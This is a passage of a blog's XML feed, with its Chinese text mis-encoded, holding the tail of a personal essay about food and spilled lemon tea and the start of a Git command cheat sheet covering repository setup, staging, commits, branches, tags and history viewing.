</p><p>åœ¨è¿™é‡Œï¼Œé£Ÿç‰©æœ‰ç€å®ƒè¯¥æœ‰çš„å‘³é“ã€‚åœ¨åƒè…»äº†å¤–å–çš„é‚£ç§å¹²ç‡¥åï¼Œå¾ˆé•¿ä¸€æ®µæ—¶é—´èƒƒå£å¤„äºé—­å¡çš„çŠ¶æ€ï¼Œå¶ç„¶ç‚¹çš„ä¸€ä»½è èç‰›è‚‰é¥­ï¼Œè§£é”äº†ä¸€äº›æ–°çš„ä½“éªŒã€‚  </p><p><img src="/posts/tea-maker/29.png" alt="é£ŸæˆŸä¹‹çµ"></p><h2 id="äºŒã€ç‚¹äº®å®¿èˆçš„æŸ æª¬"><a href="#äºŒã€ç‚¹äº®å®¿èˆçš„æŸ æª¬" class="headerlink" title="äºŒã€ç‚¹äº®å®¿èˆçš„æŸ æª¬"></a>äºŒã€ç‚¹äº®å®¿èˆçš„æŸ æª¬</h2><p>ç”±éšæ‰‹ç¿»å€’çš„æ»¡æ¯çš„æŸ æª¬ç»¿èŒ¶æ‰€é‡Šæ”¾çš„æ„è±¡æ€ªç‰©ã€‚     </p><p>æŸå®¶åº—çš„é¥®å“é‡Œå¸¸å¸¸ä¼šæ”¾å…¥å¤§åªçš„æœå—æœç‰‡ï¼ŒåŸºæœ¬å•ƒå®Œäº†æ°´æœèŒ¶æ°´ä¹Ÿå°±å‰©ä¸‹ä¸€ç‚¹ï¼Œæ”¾äº†å†°å—çš„ä¸œè¥¿å¾—è¶å†·å–ï¼Œçƒ­äº†åŒ–äº†æ·¡äº†ï¼Œè¿™æ¯é¥®å“è¿·äººçš„åœ°æ–¹å°±å°‘äº†ï¼Œé‚£ç§æœ‰ç‚¹å…ˆå‰çš„è°ƒå‘³ä½†æ˜¯åˆæºæ‚ç€èåŒ–çš„äººå·¥å†°å—çš„å¡‘æ–™å‘³çš„ä¸œè¥¿ï¼Œä¸æ˜¯å¾ˆèƒ½æ¥å—ï¼Œä»¥åä¹Ÿä¸ä¼šã€‚   </p><p>æ€¥ç€å¼€ç”µè„‘æ‰“ç¿»äº†æ¯åˆšä¹°çš„æŸ æª¬èŒ¶ï¼Œä¸å¼€å¿ƒï¼Œå…¶å®æœ€è¿‘é‡åˆ°äº†å¾ˆå¤šä¸é¡ºå¿ƒçš„äº‹ï¼ŒçŸ¥é“è¦å»è°ƒæ•´ï¼Œå´æƒ°äºçƒ¦èºä¸æŠ±æ€¨ã€‚å€’ç¿»çš„ç»¿èŒ¶å¾ˆæ— æ„åœ°ç‚¹äº®äº†è¿™ä¸ªåœ°æ–¹ï¼Œæ“¦å¹²åœ°é¢çš„æ—¶å€™ï¼Œæœ‰å¾ˆèˆ’æœçš„å‘³é“å……ç›ˆç€è¿™é—´å±‹å­ï¼Œé™æ¸©æ¶ˆç‡¥ï¼Œå¿™ç€æœŸæœ«è€ƒå¥½ä¹…æœªæ‹–çš„åœ°ï¼Œä¹Ÿè¶ç€è¿™ä¸ªæœºä¼šå¹²å‡€äº†ä¸€æŠŠã€‚    </p><p>ä¸ä¼šå–œæ¬¢é¸¡æ±¤ç±»çš„ä¸œè¥¿ï¼Œå¹¶ä¸æ˜¯é‚£ä¹ˆé€‚åˆå¤§éƒ¨åˆ†äººï¼Œæœ‰æ—¶å€™è¿˜ä¼šå˜æˆå¼ºæ‰­æŸç§å¢ƒé‡çš„æªè¾ï¼Œçœ‹ç€ä¸æ˜¯å¾ˆèˆ’æœã€‚å½“ç„¶ç¿»å€’çš„æŸ æª¬æ°´çš„æ¸…é¦™æ˜¯çœŸï¼Œè¿™ä¸ªä½“éªŒæ˜¯çœŸå®å­˜åœ¨çš„ï¼Œä¹Ÿçš„ç¡®æ„‰æ‚¦äº†ä¸€ä¼šå„¿ï¼Œå†è¿‡ä¸€ä¼šå„¿å‘³é“æ²¡äº†ï¼Œä¾¿åˆå›åˆ°äº†ä¸€è‚¡ç‡¥çƒ­ä¸­ã€‚ä»¥åŠåœ°é¢ä¼¼ä¹æ²¡æ‹–å¹²å‡€ï¼Œé»ï¼Œä¹ï¼Œä¹â€¦â€¦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è èï¼Œé’èœï¼Œç‰›è‚‰ï¼Œç±³é¥­ï¼ŒèŠéº»ï¼Œç•ªèŒ„è›‹æ±¤ã€‚      &lt;/p&gt;
    
    </summary>
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/categories/%E7%85%AE%E5%AD%97/"/>
    
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/tags/%E7%85%AE%E5%AD%97/"/>
    
  </entry>
  
  <entry>
    <title>GIT æ—¶å…‰æœº</title>
    <link href="https://cyris.pen.moe/posts/git/"/>
    <id>https://cyris.pen.moe/posts/git/</id>
    <published>2017-05-12T16:17:27.000Z</published>
    <updated>2018-04-01T06:39:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>Akå¸ˆå‚…çš„å°ç¶ä¸Šè°ˆäº†äº›å…³äºgitçš„å¸¸è§ç”¨æ³•ï¼Œå›å»ä»¥ååšäº†äº›æ•´ç†ã€‚</p><a id="more"></a><p>å‚è€ƒé“¾æ¥ï¼š</p><blockquote><p><a href="https://wiki.vidar.club/doku.php?id=wiki:git%E6%97%B6%E5%85%89%E6%9C%BA" target="_blank" rel="noopener">Akliså†™çš„wiki</a><br><a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">é˜®ä¸€å³°çš„gitæ•™ç¨‹</a><br><a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">å»–é›ªå³°çš„gitæ•™ç¨‹</a></p></blockquote><h1 id="ä¸€ã€æ—¶å…‰æœºç¡¬ä»¶è¯´æ˜ä¹¦"><a href="#ä¸€ã€æ—¶å…‰æœºç¡¬ä»¶è¯´æ˜ä¹¦" class="headerlink" title="ä¸€ã€æ—¶å…‰æœºç¡¬ä»¶è¯´æ˜ä¹¦"></a>ä¸€ã€æ—¶å…‰æœºç¡¬ä»¶è¯´æ˜ä¹¦</h1><ul><li><strong>Workspaceï¼š</strong> å·¥ä½œåŒº</li><li><strong>Index / Stageï¼š</strong> æš‚å­˜åŒº</li><li><strong>Repositoryï¼š</strong> æœ¬åœ°ä»“åº“</li><li><strong>Remoteï¼š</strong> è¿œç¨‹ä»“åº“</li><li><strong>HEADï¼š</strong> å½“å‰åˆ†æ”¯</li><li><strong>Commit historyï¼š</strong> å†å²è®°å½•</li></ul><h2 id="0X01-é›¶ä»¶ç»„è£…"><a href="#0X01-é›¶ä»¶ç»„è£…" class="headerlink" title="0X01 é›¶ä»¶ç»„è£…"></a>0X01 é›¶ä»¶ç»„è£…</h2><p>è¿™é‡Œæœ‰ä¸‰ç§æƒ…å†µï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªGitä»£ç åº“(å¦‚æœæ˜¯è¦ä½¿ç”¨githubä¸Šçš„åº“ï¼Œéœ€è¦å…ˆpullä¸‹æ¥ï¼Œä¸ç„¶æ— æ³•</span><br><span class="line">pushåˆ°ç›®æ ‡åº“ï¼Œè¿™é‡Œçš„ç¬¬ä¸‰ç§æ–¹æ³•å°±å¯ä»¥ã€‚)</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line">2. æ–°å»ºç›®å½•ï¼Œå°†å…¶åˆå§‹åŒ–ä¸ºGitä»“åº“</span><br><span class="line">$ git init project-name</span><br><span class="line"></span><br><span class="line">3. pullä¸‹æ¥ä¸€ä¸ªé¡¹ç›®ä¸å…¶ä»£ç å†å²</span><br><span class="line">$ git <span class="built_in">clone</span> URL</span><br></pre></td></tr></table></figure><h2 id="0X02-æ—¶å…‰æœºçš„é…ç½®"><a href="#0X02-æ—¶å…‰æœºçš„é…ç½®" class="headerlink" title="0X02 æ—¶å…‰æœºçš„é…ç½®"></a>0X02 æ—¶å…‰æœºçš„é…ç½®</h2><p>Gitæœ‰ä¸ªè®¾ç½®æ–‡ä»¶<strong>.gitconfig</strong>ï¼Œå®ƒå¯ä»¥å…¨å±€é…ç½®ï¼Œä¹Ÿå¯ä»¥é¡¹ç›®é…ç½®ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.æ˜¾ç¤ºå½“å‰çš„Gité…ç½®</span><br><span class="line">$ git<span class="built_in"> config </span>--list</span><br><span class="line"></span><br><span class="line">2.ç¼–è¾‘Gité…ç½®æ–‡ä»¶</span><br><span class="line">$ git<span class="built_in"> config </span>-e [--global]</span><br><span class="line"></span><br><span class="line">3.è®¾ç½®æäº¤ä»£ç æ—¶çš„ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">$ git<span class="built_in"> config </span>[--global] user.name <span class="string">"name"</span></span><br><span class="line">$ git<span class="built_in"> config </span>[--global] user.email <span class="string">"email address"</span></span><br></pre></td></tr></table></figure><h2 id="0X03-åœ¨æ—¶å…‰æœºä¸Šæ³¨å…¥addé’™å¥¶"><a href="#0X03-åœ¨æ—¶å…‰æœºä¸Šæ³¨å…¥addé’™å¥¶" class="headerlink" title="0X03 åœ¨æ—¶å…‰æœºä¸Šæ³¨å…¥addé’™å¥¶"></a>0X03 åœ¨æ—¶å…‰æœºä¸Šæ³¨å…¥addé’™å¥¶</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.æ·»åŠ æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add file1 file2 ...    </span></span><br><span class="line"></span><br><span class="line">2.æ·»åŠ æŒ‡å®šç›®å½•åˆ°æš‚å­˜åŒºï¼ˆåŒ…æ‹¬å…¶ä¸­çš„å­ç›®å½•ï¼‰</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add dirï¼ˆæ–‡ä»¶å¤¹åç§°ï¼‰</span></span><br><span class="line"></span><br><span class="line">3.æ·»åŠ å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"></span><br><span class="line">4.åˆ†æ¬¡æäº¤</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add -p</span></span><br><span class="line"></span><br><span class="line">5.åˆ é™¤å·¥ä½œåŒºæ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠè¿™æ¬¡åˆ é™¤æ”¾å…¥æš‚å­˜åŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git rm file1 file2 ...</span></span><br><span class="line"></span><br><span class="line">6.åœæ­¢è¿½è¸ªæŒ‡å®šæ–‡ä»¶ï¼ˆè¯¥æ–‡ä»¶ä¼šä¿ç•™åœ¨å·¥ä½œåŒºï¼‰</span><br><span class="line"><span class="meta">$</span><span class="bash"> git rm --cached file</span></span><br><span class="line"></span><br><span class="line">7.æ”¹åæ–‡ä»¶ï¼Œç„¶åæŠŠè¿™ä¸ªæ”¹åæ–‡ä»¶æ”¾å…¥æš‚å­˜åŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git mv file-original file-renamed</span></span><br></pre></td></tr></table></figure><h2 id="0X04-æŒªæŒªæŒªï¼ŒæŒªè¿›ä»“åº“"><a href="#0X04-æŒªæŒªæŒªï¼ŒæŒªè¿›ä»“åº“" class="headerlink" title="0X04 æŒªæŒªæŒªï¼ŒæŒªè¿›ä»“åº“"></a>0X04 æŒªæŒªæŒªï¼ŒæŒªè¿›ä»“åº“</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.æäº¤æš‚å­˜åŒºåˆ°ä»“åº“åŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"message"</span></span></span><br><span class="line"></span><br><span class="line">2.æäº¤æš‚å­˜åŒºæŒ‡å®šæ–‡ä»¶åˆ°ä»“åº“åŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit file1 file2 ... -m <span class="string">"message"</span></span></span><br><span class="line"></span><br><span class="line">3.æäº¤å·¥ä½œåŒºè‡ªä¸Šæ¬¡commitä¹‹åçš„å˜åŒ–ï¼Œç›´æ¥åˆ°ä»“åº“åŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit <span class="_">-a</span></span></span><br><span class="line"></span><br><span class="line">4.æäº¤æ—¶æ˜¾ç¤ºæ‰€æœ‰diffä¿¡æ¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -v</span></span><br><span class="line"></span><br><span class="line">5.ä½¿ç”¨ä¸€æ¬¡æ–°çš„commitï¼Œæ›¿ä»£ä¸Šä¸€æ¬¡æäº¤ã€‚å¦‚æœä»£ç æ²¡æœ‰ä»»ä½•æ–°å˜åŒ–ï¼Œåˆ™ç”¨æ¥æ”¹å†™ä¸Šä¸€æ¬¡commitçš„æäº¤ä¿¡æ¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit --amend -m <span class="string">"message"</span></span></span><br><span class="line"></span><br><span class="line">6.é‡åšä¸Šä¸€æ¬¡commitï¼Œå¹¶åŒ…æ‹¬æŒ‡å®šæ–‡ä»¶çš„æ–°å˜åŒ–</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit --amend file1 file2 ...</span></span><br></pre></td></tr></table></figure><h2 id="0X05-æ—¶å…‰æœºåˆ†æœº"><a href="#0X05-æ—¶å…‰æœºåˆ†æœº" class="headerlink" title="0X05 æ—¶å…‰æœºåˆ†æœº"></a>0X05 æ—¶å…‰æœºåˆ†æœº</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1.åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line"></span><br><span class="line">2.åˆ—å‡ºæ‰€æœ‰è¿œç¨‹åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -r</span></span><br><span class="line"></span><br><span class="line">3.åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch <span class="_">-a</span></span></span><br><span class="line"></span><br><span class="line">4.æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä½†ä¾ç„¶åœç•™åœ¨å½“å‰åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch [branch-name]</span></span><br><span class="line"></span><br><span class="line">5.æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b [branch]</span></span><br><span class="line"></span><br><span class="line">6.æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŒ‡å®šcommit</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch [branch] [commit]</span></span><br><span class="line"></span><br><span class="line">7.æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯å»ºç«‹è¿½è¸ªå…³ç³»</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch --track [branch] [remote-branch]</span></span><br><span class="line"></span><br><span class="line">8.åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ï¼Œå¹¶æ›´æ–°å·¥ä½œåŒº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branch-name]</span></span><br><span class="line"></span><br><span class="line">9.åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªåˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -</span></span><br><span class="line"></span><br><span class="line">10.å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œåœ¨ç°æœ‰åˆ†æ”¯ä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯ä¹‹é—´</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch --set-upstream [branch] [remote-branch]</span></span><br><span class="line"></span><br><span class="line">11.åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge [branch]</span></span><br><span class="line"></span><br><span class="line">12.é€‰æ‹©ä¸€ä¸ªcommitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick [commit]</span></span><br><span class="line"></span><br><span class="line">13.åˆ é™¤åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch <span class="_">-d</span> [branch-name]</span></span><br><span class="line"></span><br><span class="line">14.åˆ é™¤è¿œç¨‹åˆ†æ”¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin --delete [branch-name]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -dr [remote/branch]</span></span><br></pre></td></tr></table></figure><h2 id="0X06-Tag"><a href="#0X06-Tag" class="headerlink" title="0X06 Tag"></a>0X06 Tag</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.åˆ—å‡ºæ‰€æœ‰<span class="keyword">tag</span></span><br><span class="line">$ git <span class="keyword">tag</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.æ–°å»ºä¸€ä¸ª<span class="keyword">tag</span>åœ¨å½“å‰commit</span><br><span class="line">$ git <span class="keyword">tag</span> <span class="title">[tag</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.æ–°å»ºä¸€ä¸ª<span class="keyword">tag</span>åœ¨æŒ‡å®šcommit</span><br><span class="line">$ git <span class="keyword">tag</span> <span class="title">[tag</span>] [commit]</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.åˆ é™¤æœ¬åœ°<span class="keyword">tag</span></span><br><span class="line">$ git <span class="keyword">tag</span> <span class="title">-d</span> [<span class="keyword">tag</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.åˆ é™¤è¿œç¨‹<span class="keyword">tag</span></span><br><span class="line">$ git push origin :refs/tags/[tagName]</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.æŸ¥çœ‹<span class="keyword">tag</span>ä¿¡æ¯</span><br><span class="line">$ git show [<span class="keyword">tag</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.æäº¤æŒ‡å®š<span class="keyword">tag</span></span><br><span class="line">$ git push [remote] [<span class="keyword">tag</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.æäº¤æ‰€æœ‰<span class="keyword">tag</span></span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>.æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŸä¸ª<span class="keyword">tag</span></span><br><span class="line">$ git checkout -b [branch] [<span class="keyword">tag</span>]</span><br></pre></td></tr></table></figure><h2 id="0X07-ä¿¡æ¯æŸ¥çœ‹"><a href="#0X07-ä¿¡æ¯æŸ¥çœ‹" class="headerlink" title="0X07 ä¿¡æ¯æŸ¥çœ‹"></a>0X07 ä¿¡æ¯æŸ¥çœ‹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">1.æ˜¾ç¤ºæœ‰å˜æ›´çš„æ–‡ä»¶</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line"></span><br><span class="line">2.æ˜¾ç¤ºå½“å‰åˆ†æ”¯çš„ç‰ˆæœ¬å†å²</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line"></span><br><span class="line">3.æ˜¾ç¤ºcommitå†å²ï¼Œä»¥åŠæ¯æ¬¡commitå‘ç”Ÿå˜æ›´çš„æ–‡ä»¶</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --stat</span></span><br><span class="line"></span><br><span class="line">4.æœç´¢æäº¤å†å²ï¼Œæ ¹æ®å…³é”®è¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> -S [keyword]</span></span><br><span class="line"></span><br><span class="line">5.æ˜¾ç¤ºæŸä¸ªcommitä¹‹åçš„æ‰€æœ‰å˜åŠ¨ï¼Œæ¯ä¸ªcommitå æ®ä¸€è¡Œ</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> [tag] HEAD --pretty=format:%s</span></span><br><span class="line"></span><br><span class="line">6.æ˜¾ç¤ºæŸä¸ªcommitä¹‹åçš„æ‰€æœ‰å˜åŠ¨ï¼Œå…¶"æäº¤è¯´æ˜"å¿…é¡»ç¬¦åˆæœç´¢æ¡ä»¶</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> [tag] HEAD --grep feature</span></span><br><span class="line"></span><br><span class="line">7.æ˜¾ç¤ºæŸä¸ªæ–‡ä»¶çš„ç‰ˆæœ¬å†å²ï¼ŒåŒ…æ‹¬æ–‡ä»¶æ”¹å</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --follow [file]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git whatchanged [file]</span></span><br><span class="line"></span><br><span class="line">8.æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶ç›¸å…³çš„æ¯ä¸€æ¬¡diff</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> -p [file]</span></span><br><span class="line"></span><br><span class="line">9.æ˜¾ç¤ºè¿‡å»5æ¬¡æäº¤</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> -5 --pretty --oneline</span></span><br><span class="line"></span><br><span class="line">10.æ˜¾ç¤ºæ‰€æœ‰æäº¤è¿‡çš„ç”¨æˆ·ï¼ŒæŒ‰æäº¤æ¬¡æ•°æ’åº</span><br><span class="line"><span class="meta">$</span><span class="bash"> git shortlog -sn</span></span><br><span class="line"></span><br><span class="line">11.æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶æ˜¯ä»€ä¹ˆäººåœ¨ä»€ä¹ˆæ—¶é—´ä¿®æ”¹è¿‡</span><br><span class="line"><span class="meta">$</span><span class="bash"> git blame [file]</span></span><br><span class="line"></span><br><span class="line">12.æ˜¾ç¤ºæš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff</span></span><br><span class="line"></span><br><span class="line">13.æ˜¾ç¤ºæš‚å­˜åŒºå’Œä¸Šä¸€ä¸ªcommitçš„å·®å¼‚</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff --cached [file]</span></span><br><span class="line"></span><br><span class="line">14.æ˜¾ç¤ºå·¥ä½œåŒºä¸å½“å‰åˆ†æ”¯æœ€æ–°commitä¹‹é—´çš„å·®å¼‚</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff HEAD</span></span><br><span class="line"></span><br><span class="line">15.æ˜¾ç¤ºä¸¤æ¬¡æäº¤ä¹‹é—´çš„å·®å¼‚</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff [first-branch]...[second-branch]</span></span><br><span class="line"></span><br><span class="line">16.æ˜¾ç¤ºä»Šå¤©ä½ å†™äº†å¤šå°‘è¡Œä»£ç </span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff --shortstat <span class="string">"@&#123;0 day ago&#125;"</span></span></span><br><span class="line"></span><br><span class="line">17.æ˜¾ç¤ºæŸæ¬¡æäº¤çš„å…ƒæ•°æ®å’Œå†…å®¹å˜åŒ–</span><br><span class="line"><span class="meta">$</span><span class="bash"> git show [commit]</span></span><br><span class="line"></span><br><span class="line">18.æ˜¾ç¤ºæŸæ¬¡æäº¤å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶</span><br><span class="line"><span class="meta">$</span><span class="bash"> git show --name-only [commit]</span></span><br><span class="line"></span><br><span class="line">19.æ˜¾ç¤ºæŸæ¬¡æäº¤æ—¶ï¼ŒæŸä¸ªæ–‡ä»¶çš„å†…å®¹</span><br><span class="line"><span class="meta">$</span><span class="bash"> git show [commit]:[filename]</span></span><br><span class="line"></span><br><span class="line">20.æ˜¾ç¤ºå½“å‰åˆ†æ”¯çš„æœ€è¿‘å‡ æ¬¡æäº¤</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br></pre></td></tr></table></figure><h2 id="0X08-è¿œç¨‹åŒæ­¥ç¯‡"><a href="#0X08-è¿œç¨‹åŒæ­¥ç¯‡" class="headerlink" title="0X08 è¿œç¨‹åŒæ­¥ç¯‡"></a>0X08 è¿œç¨‹åŒæ­¥ç¯‡</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.ä¸‹è½½è¿œç¨‹ä»“åº“çš„æ‰€æœ‰å˜åŠ¨</span><br><span class="line"><span class="meta">$</span><span class="bash"> git fetch 